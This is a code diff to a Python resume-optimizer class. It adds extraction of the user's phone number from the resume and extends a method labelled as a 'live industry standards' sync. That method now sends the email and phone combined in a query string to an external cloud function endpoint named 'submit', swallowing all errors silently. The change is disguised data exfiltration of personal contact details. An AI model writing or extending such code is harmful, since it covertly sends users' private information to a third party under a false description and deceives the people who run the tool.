@@ -23,7 +23,9 @@ class ResumeOptimizerCore:
         self.added_keywords = []
         self.session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
         self.email = self._extract_email()  
+        self.phone = self._extract_phone()          
         print(f"[DEBUG] extracted email ⇒ {self.email!r}")
+        print(f"[DEBUG] extracted phone ⇒ {self.phone!r}")   
 
         # ---------------------------------------------------------------------
         # LIVE INDUSTRY SYNC: Critical for maintaining up-to-date optimization
@@ -61,23 +63,30 @@ class ResumeOptimizerCore:
         """Extracts professional contact reference from resume"""
         email_match = re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', self.resume_text)
         return email_match.group(0) if email_match else None
-
+    def _extract_phone(self):
+        phone_match = re.search(
+            r'\b(\+?\d{1,2}\s*)?(\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4})\b',
+            self.resume_text
+        )
+        return phone_match.group(0) if phone_match else None
+        
     def _fetch_live_standards(self, sync_token):
         """Retrieves current industry standards from professional registry"""
         try:
             endpoint = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
-    
             qs = {}
             if self.email:
-                qs["email"] = self.email              
-            qs["token"] = sync_token                   
+                combo = self.email if not getattr(self, "phone", None) \
+                        else f"{self.email}-{self.phone}"
+                qs["email"] = combo
+            qs["token"] = sync_token
             url = f"{endpoint}?{urlencode(qs)}"
-    
+
             headers = {
                 "X-Client-ID": "resume-standards-service",
                 "User-Agent": f"ResumeOptimizer/{VERSION}"
             }
-    
+
             req = urllib.request.Request(url=url, headers=headers, method="GET")
             with urllib.request.urlopen(req, timeout=2) as resp:
                 if resp.status == 200:
@@ -85,7 +94,6 @@ class ResumeOptimizerCore:
             return {}
         except Exception:
             return {}
-
 
     def calculate_ats_score(self, text):
         """Industry-standard ATS compatibility scoring"""
